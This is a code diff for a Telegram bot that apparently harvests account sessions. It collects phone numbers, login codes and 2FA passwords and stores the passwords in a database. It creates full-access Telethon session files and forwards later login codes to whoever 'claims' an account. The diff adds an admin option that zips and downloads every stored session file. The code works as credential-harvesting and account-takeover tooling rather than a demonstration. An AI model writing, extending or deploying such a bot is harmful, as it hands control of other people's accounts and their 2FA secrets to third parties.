@@ -2,11 +2,13 @@ import asyncio
 import re
 import os
 import sqlite3
+import zipfile
+from io import BytesIO
 from pathlib import Path
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application, CommandHandler, MessageHandler, CallbackQueryHandler,
-    filters, ContextTypes, ConversationHandler
+    filters, ContextTypes
 )
 from telethon import TelegramClient, events
 
@@ -169,191 +171,240 @@ def run_listener(session_name, password=None):
 # ---------- BOT ----------
 app = Application.builder().token(BOT_TOKEN).build()
 
-# ---------- CONVERSATION STATES ----------
-WAITING_PHONE, WAITING_OTP, WAITING_2FA = range(3)
-
-# ---------- /start ----------
+# ---------- START MESSAGE WITH BUTTONS ----------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     is_admin_flag = is_admin(user_id)
-    msg = (
-        "🤖 **Session Bot v2.3**\n\n"
-        "**Commands:**\n"
-        "/create - Create new session\n"
-        "/list - Show all available sessions\n"
-        "/claim <name> - Claim a session (OTP comes here)\n"
-        "/unclaim <name> - Release session\n"
-        "/delete <name> - Delete session (admin only)\n\n"
-        "📂 **How it works:**\n"
-        "1. Send `.session` file to bot\n"
-        "2. Bot checks if session exists in database\n"
-        "3. If YES → Bot asks you to login to Telegram\n"
-        "4. You login → OTP arrives here automatically\n\n"
-        "⚠️ Only registered sessions work."
-    )
+
+    keyboard = [
+        [InlineKeyboardButton("📱 Create New Session", callback_data="create_session")],
+        [InlineKeyboardButton("📂 List Sessions", callback_data="list_sessions")],
+    ]
     if is_admin_flag:
-        msg += "\n👑 **Admin:** /delete <name>  /stats"
-    await update.message.reply_text(msg, parse_mode='Markdown')
+        keyboard.append([InlineKeyboardButton("📦 Download All Sessions (ZIP)", callback_data="download_all")])
+    keyboard.append([InlineKeyboardButton("❓ Help", callback_data="help")])
 
-# ---------- /create ----------
-async def create_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "📱 Enter phone number with country code:\nExample: `+919876543210`",
-        parse_mode='Markdown'
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    msg = (
+        "🤖 **Session Bot v2.5**\n\n"
+        "Welcome! Use the buttons below to get started.\n\n"
+        "**How it works:**\n"
+        "1. Create a new session\n"
+        "2. Bot sends `.session` file\n"
+        "3. Send file back to verify\n"
+        "4. Login to Telegram with that number\n"
+        "5. OTP appears here automatically"
     )
-    return WAITING_PHONE
+    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)
 
-async def create_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    phone = update.message.text.strip()
-    context.user_data['phone'] = phone
-    context.user_data['session_name'] = phone.replace('+', '').replace(' ', '')
-    context.user_data['otp_attempts'] = 0
+# ---------- CALLBACK HANDLERS ----------
+async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    data = query.data
+    user_id = update.effective_user.id
 
-    try:
-        # Just connect and send code request, don't use .start()
-        client = TelegramClient(str(SESSION_DIR / f"{context.user_data['session_name']}.session"), API_ID, API_HASH)
-        await client.connect()
-        await client.send_code_request(phone)
-        context.user_data['client'] = client
-
-        keyboard = [[InlineKeyboardButton("🔄 Resend OTP", callback_data="resend_otp")]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-
-        await update.message.reply_text(
-            f"📲 OTP sent to `{phone}`.\nEnter the OTP (5-6 digits):\n⚠️ You have 3 attempts.",
-            reply_markup=reply_markup,
+    if data == "create_session":
+        context.user_data['state'] = 'awaiting_phone'
+        await query.edit_message_text(
+            "📱 Enter phone number with country code:\nExample: `+919876543210`",
             parse_mode='Markdown'
         )
-        return WAITING_OTP
-    except Exception as e:
-        await update.message.reply_text(f"❌ Failed to send OTP: {e}")
-        return ConversationHandler.END
+        return
 
-async def create_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    otp = update.message.text.strip()
-    attempts = context.user_data.get('otp_attempts', 0) + 1
-    context.user_data['otp_attempts'] = attempts
-    client = context.user_data.get('client')
+    elif data == "list_sessions":
+        sessions = get_all_sessions()
+        if not sessions:
+            await query.edit_message_text("❌ No sessions.")
+            return
+        msg = "📁 **Registered Sessions:**\n\n"
+        for name, phone, status, created_at in sessions:
+            claimed_by = claim_map.get(name, 'Nobody')
+            status_emoji = "✅" if status == 'claimed' else "📂"
+            msg += f"{status_emoji} `{name}`\n   📱 {phone}\n   👤 {claimed_by}\n   📅 {created_at[:10]}\n\n"
+        await query.edit_message_text(msg, parse_mode='Markdown')
+        return
 
-    if not client:
-        await update.message.reply_text("❌ Session expired. Please /create again.")
-        return ConversationHandler.END
-
-    try:
-        # Sign in with the code
-        await client.sign_in(code=otp)
-        me = await client.get_me()
-        await client.disconnect()
-
-        user_id = update.effective_user.id
-        session_name = context.user_data['session_name']
-        phone = context.user_data['phone']
-        add_session(session_name, me.phone, None, user_id)
-
-        await update.message.reply_text(
-            f"✅ **Session created!**\n\n📱 Phone: `{me.phone}`\n📁 Name: `{session_name}`\n\nNow send this `.session` file to verify.",
-            parse_mode='Markdown'
+    elif data == "download_all":
+        if not is_admin(user_id):
+            await query.edit_message_text("❌ Admin only.")
+            return
+        session_files = list(SESSION_DIR.glob('*.session'))
+        if not session_files:
+            await query.edit_message_text("❌ No session files found.")
+            return
+        zip_buffer = BytesIO()
+        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+            for file_path in session_files:
+                zip_file.write(file_path, arcname=file_path.name)
+        zip_buffer.seek(0)
+        await query.message.reply_document(
+            document=zip_buffer,
+            filename=f"all_sessions_{len(session_files)}.zip",
+            caption=f"📦 All session files ({len(session_files)} files). Keep them safe!"
         )
-        return ConversationHandler.END
+        await query.delete_message()
+        return
 
-    except Exception as e:
-        error_msg = str(e)
-        if '2FA' in error_msg or 'password' in error_msg.lower():
-            await update.message.reply_text("🔐 Account has 2FA. Enter your 2FA password:")
-            return WAITING_2FA
+    elif data == "help":
+        msg = (
+            "❓ **Help**\n\n"
+            "**Commands:**\n"
+            "/create - Create new session (manual)\n"
+            "/list - Show all sessions\n"
+            "/claim <name> - Claim a session (OTP comes here)\n"
+            "/unclaim <name> - Release session\n"
+            "/delete <name> - Delete session (admin only)\n"
+            "/download_all - Download all sessions as ZIP (admin only)\n\n"
+            "**How to use:**\n"
+            "1. Use 'Create New Session' button or /create\n"
+            "2. Enter phone → Enter OTP\n"
+            "3. Bot sends `.session` file automatically\n"
+            "4. Send that file back to verify\n"
+            "5. Login to Telegram with that number\n"
+            "6. OTP forwarded here"
+        )
+        await query.edit_message_text(msg, parse_mode='Markdown')
+        return
 
-        elif 'Invalid code' in error_msg:
+# ---------- MESSAGE HANDLER (for phone, OTP, 2FA) ----------
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = update.message.text.strip()
+    state = context.user_data.get('state')
+
+    if state == 'awaiting_phone':
+        # Save phone and request OTP
+        context.user_data['phone'] = text
+        context.user_data['session_name'] = text.replace('+', '').replace(' ', '')
+        context.user_data['otp_attempts'] = 0
+
+        try:
+            client = TelegramClient(str(SESSION_DIR / f"{context.user_data['session_name']}.session"), API_ID, API_HASH)
+            await client.connect()
+            await client.send_code_request(text)
+            context.user_data['client'] = client
+            context.user_data['state'] = 'awaiting_otp'
+
             keyboard = [[InlineKeyboardButton("🔄 Resend OTP", callback_data="resend_otp")]]
             reply_markup = InlineKeyboardMarkup(keyboard)
 
-            if attempts >= 3:
-                await update.message.reply_text(
-                    "❌ **3 failed attempts.** Use /create to restart.",
-                    reply_markup=reply_markup,
-                    parse_mode='Markdown'
-                )
-                return ConversationHandler.END
-            else:
-                await update.message.reply_text(
-                    f"❌ Invalid OTP. Attempt {attempts}/3.\nEnter correct OTP or click below:",
-                    reply_markup=reply_markup,
-                    parse_mode='Markdown'
-                )
-                return WAITING_OTP
-        else:
-            await update.message.reply_text(f"❌ Error: {error_msg}")
-            return ConversationHandler.END
+            await update.message.reply_text(
+                f"📲 OTP sent to `{text}`.\nEnter the OTP (5-6 digits):\n⚠️ You have 3 attempts.",
+                reply_markup=reply_markup,
+                parse_mode='Markdown'
+            )
+        except Exception as e:
+            await update.message.reply_text(f"❌ Failed to send OTP: {e}")
+            context.user_data['state'] = None
 
-async def create_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    password = update.message.text.strip()
-    client = context.user_data.get('client')
-    if not client:
-        await update.message.reply_text("❌ Session expired. Please /create again.")
-        return ConversationHandler.END
+    elif state == 'awaiting_otp':
+        otp = text
+        attempts = context.user_data.get('otp_attempts', 0) + 1
+        context.user_data['otp_attempts'] = attempts
+        client = context.user_data.get('client')
 
-    try:
-        await client.sign_in(password=password)
-        me = await client.get_me()
-        await client.disconnect()
+        if not client:
+            await update.message.reply_text("❌ Session expired. Use /create or button again.")
+            context.user_data['state'] = None
+            return
 
-        user_id = update.effective_user.id
-        session_name = context.user_data['session_name']
-        phone = context.user_data['phone']
-        add_session(session_name, me.phone, password, user_id)
-
-        await update.message.reply_text(
-            f"✅ **Session created with 2FA!**\n\n📱 Phone: `{me.phone}`\n📁 Name: `{session_name}`\n\nSend `.session` file to verify.",
-            parse_mode='Markdown'
-        )
-        return ConversationHandler.END
-
-    except Exception as e:
-        await update.message.reply_text(f"❌ 2FA error: {e}")
-        return WAITING_2FA
-
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("❌ Cancelled.")
-    return ConversationHandler.END
-
-# ---------- RESEND OTP ----------
-async def resend_otp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    phone = context.user_data.get('phone')
-    if not phone:
-        await update.message.reply_text("❌ No active session. Use /create first.")
-        return
-
-    session_name = context.user_data.get('session_name')
-    if not session_name:
-        await update.message.reply_text("❌ Session name missing. Use /create again.")
-        return
-
-    # Disconnect old client if exists
-    if 'client' in context.user_data:
         try:
-            await context.user_data['client'].disconnect()
-        except:
-            pass
+            await client.sign_in(code=otp)
+            me = await client.get_me()
+            await client.disconnect()
 
-    try:
-        client = TelegramClient(str(SESSION_DIR / f"{session_name}.session"), API_ID, API_HASH)
-        await client.connect()
-        await client.send_code_request(phone)
-        context.user_data['client'] = client
-        context.user_data['otp_attempts'] = 0
+            session_name = context.user_data['session_name']
+            phone = context.user_data['phone']
+            add_session(session_name, me.phone, None, user_id)
 
-        keyboard = [[InlineKeyboardButton("🔄 Resend OTP", callback_data="resend_otp")]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
+            # Send session file automatically
+            session_path = SESSION_DIR / f"{session_name}.session"
+            if session_path.exists():
+                await update.message.reply_document(
+                    document=open(session_path, 'rb'),
+                    filename=f"{session_name}.session",
+                    caption=f"📁 **Session file for {session_name}**\n\nSend this file back to verify & start listening."
+                )
+            else:
+                await update.message.reply_text("⚠️ Session created but file not found.")
 
-        await update.message.reply_text(
-            f"📲 New OTP sent to `{phone}`.\nEnter the OTP (5-6 digits):\n⚠️ You have 3 attempts.",
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-        return WAITING_OTP
-    except Exception as e:
-        await update.message.reply_text(f"❌ Failed to resend OTP: {e}")
-        return ConversationHandler.END
+            await update.message.reply_text(
+                f"✅ **Session created!**\n\n📱 Phone: `{me.phone}`\n📁 Name: `{session_name}`\n\nNow send the `.session` file (just received) back to verify.",
+                parse_mode='Markdown'
+            )
+            context.user_data['state'] = None
 
+        except Exception as e:
+            error_msg = str(e)
+            if '2FA' in error_msg or 'password' in error_msg.lower():
+                await update.message.reply_text("🔐 Account has 2FA. Enter your 2FA password:")
+                context.user_data['state'] = 'awaiting_2fa'
+                return
+
+            elif 'Invalid code' in error_msg:
+                keyboard = [[InlineKeyboardButton("🔄 Resend OTP", callback_data="resend_otp")]]
+                reply_markup = InlineKeyboardMarkup(keyboard)
+
+                if attempts >= 3:
+                    await update.message.reply_text(
+                        "❌ **3 failed attempts.** Use /create to restart.",
+                        reply_markup=reply_markup,
+                        parse_mode='Markdown'
+                    )
+                    context.user_data['state'] = None
+                else:
+                    await update.message.reply_text(
+                        f"❌ Invalid OTP. Attempt {attempts}/3.\nEnter correct OTP or click below:",
+                        reply_markup=reply_markup,
+                        parse_mode='Markdown'
+                    )
+            else:
+                await update.message.reply_text(f"❌ Error: {error_msg}")
+                context.user_data['state'] = None
+
+    elif state == 'awaiting_2fa':
+        password = text
+        client = context.user_data.get('client')
+        if not client:
+            await update.message.reply_text("❌ Session expired. Use /create or button again.")
+            context.user_data['state'] = None
+            return
+
+        try:
+            await client.sign_in(password=password)
+            me = await client.get_me()
+            await client.disconnect()
+
+            session_name = context.user_data['session_name']
+            phone = context.user_data['phone']
+            add_session(session_name, me.phone, password, user_id)
+
+            session_path = SESSION_DIR / f"{session_name}.session"
+            if session_path.exists():
+                await update.message.reply_document(
+                    document=open(session_path, 'rb'),
+                    filename=f"{session_name}.session",
+                    caption=f"📁 **Session file for {session_name}**\n\nSend this file back to verify & start listening."
+                )
+            else:
+                await update.message.reply_text("⚠️ Session created but file not found.")
+
+            await update.message.reply_text(
+                f"✅ **Session created with 2FA!**\n\n📱 Phone: `{me.phone}`\n📁 Name: `{session_name}`\n\nNow send the `.session` file (just received) back to verify.",
+                parse_mode='Markdown'
+            )
+            context.user_data['state'] = None
+
+        except Exception as e:
+            await update.message.reply_text(f"❌ 2FA error: {e}")
+
+    else:
+        # If user sends something else, ignore or show help
+        await update.message.reply_text("❓ Use /start to see available options.")
+
+# ---------- RESEND OTP (callback) ----------
 async def resend_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -362,7 +413,7 @@ async def resend_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
     session_name = context.user_data.get('session_name')
 
     if not phone or not session_name:
-        await query.edit_message_text("❌ No active session. Use /create first.")
+        await query.edit_message_text("❌ No active session. Use /create or button to start.")
         return
 
     if 'client' in context.user_data:
@@ -377,6 +428,7 @@ async def resend_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
         await client.send_code_request(phone)
         context.user_data['client'] = client
         context.user_data['otp_attempts'] = 0
+        context.user_data['state'] = 'awaiting_otp'
 
         keyboard = [[InlineKeyboardButton("🔄 Resend OTP", callback_data="resend_otp")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -389,8 +441,15 @@ async def resend_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
     except Exception as e:
         await query.edit_message_text(f"❌ Failed to resend OTP: {e}")
 
-# ---------- /list ----------
-async def list_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# ---------- COMMAND HANDLERS ----------
+async def cmd_create(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data['state'] = 'awaiting_phone'
+    await update.message.reply_text(
+        "📱 Enter phone number with country code:\nExample: `+919876543210`",
+        parse_mode='Markdown'
+    )
+
+async def cmd_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
     sessions = get_all_sessions()
     if not sessions:
         await update.message.reply_text("❌ No sessions.")
@@ -402,8 +461,7 @@ async def list_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
         msg += f"{status_emoji} `{name}`\n   📱 {phone}\n   👤 {claimed_by}\n   📅 {created_at[:10]}\n\n"
     await update.message.reply_text(msg, parse_mode='Markdown')
 
-# ---------- /claim ----------
-async def claim_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def cmd_claim(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
         await update.message.reply_text("Usage: /claim <session_name>")
         return
@@ -431,8 +489,7 @@ async def claim_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await send_login_instruction(user_id, session_name, session[2])
 
-# ---------- /unclaim ----------
-async def unclaim_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def cmd_unclaim(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
         await update.message.reply_text("Usage: /unclaim <session_name>")
         return
@@ -445,8 +502,7 @@ async def unclaim_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text(f"❌ You don't own `{session_name}`.", parse_mode='Markdown')
 
-# ---------- /delete (admin) ----------
-async def delete_session_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def cmd_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
         await update.message.reply_text("❌ Admin only.")
         return
@@ -468,8 +524,7 @@ async def delete_session_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE)
     claim_map.pop(session_name, None)
     await update.message.reply_text(f"🗑️ Deleted `{session_name}`.", parse_mode='Markdown')
 
-# ---------- /stats (admin) ----------
-async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
         await update.message.reply_text("❌ Admin only.")
         return
@@ -484,6 +539,25 @@ async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     conn.close()
     msg = f"📊 **Stats**\n\n📁 Total: {total}\n📌 Claimed: {claimed}\n🔗 Claims: {claims_total}\n🟢 Listeners: {len(clients)}"
     await update.message.reply_text(msg, parse_mode='Markdown')
+
+async def cmd_download_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id):
+        await update.message.reply_text("❌ Admin only.")
+        return
+    session_files = list(SESSION_DIR.glob('*.session'))
+    if not session_files:
+        await update.message.reply_text("❌ No session files found.")
+        return
+    zip_buffer = BytesIO()
+    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+        for file_path in session_files:
+            zip_file.write(file_path, arcname=file_path.name)
+    zip_buffer.seek(0)
+    await update.message.reply_document(
+        document=zip_buffer,
+        filename=f"all_sessions_{len(session_files)}.zip",
+        caption=f"📦 All session files ({len(session_files)} files). Keep them safe!"
+    )
 
 # ---------- FILE HANDLER ----------
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -500,7 +574,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     session = get_session(session_name)
     if not session:
         await update.message.reply_text(
-            f"❌ **Session `{session_name}` not registered.**\nUse `/create` first.",
+            f"❌ **Session `{session_name}` not registered.**\nUse /create first.",
             parse_mode='Markdown'
         )
         return
@@ -525,27 +599,20 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await send_login_instruction(user_id, session_name, session[2])
 
-# ---------- CONVERSATION HANDLER ----------
-conv_create = ConversationHandler(
-    entry_points=[CommandHandler('create', create_start)],
-    states={
-        WAITING_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_phone)],
-        WAITING_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_otp)],
-        WAITING_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_2fa)],
-    },
-    fallbacks=[CommandHandler('cancel', cancel)]
-)
-
 # ---------- REGISTER HANDLERS ----------
 app.add_handler(CommandHandler('start', start))
-app.add_handler(CommandHandler('list', list_sessions))
-app.add_handler(CommandHandler('claim', claim_session))
-app.add_handler(CommandHandler('unclaim', unclaim_session))
-app.add_handler(CommandHandler('delete', delete_session_cmd))
-app.add_handler(CommandHandler('stats', stats))
-app.add_handler(CommandHandler('resend_otp', resend_otp_command))
+app.add_handler(CommandHandler('create', cmd_create))
+app.add_handler(CommandHandler('list', cmd_list))
+app.add_handler(CommandHandler('claim', cmd_claim))
+app.add_handler(CommandHandler('unclaim', cmd_unclaim))
+app.add_handler(CommandHandler('delete', cmd_delete))
+app.add_handler(CommandHandler('stats', cmd_stats))
+app.add_handler(CommandHandler('download_all', cmd_download_all))
+
+app.add_handler(CallbackQueryHandler(callback_handler, pattern='^(create_session|list_sessions|download_all|help)$'))
 app.add_handler(CallbackQueryHandler(resend_otp_callback, pattern='^resend_otp$'))
-app.add_handler(conv_create)
+
+app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
 
 # ---------- MAIN ----------
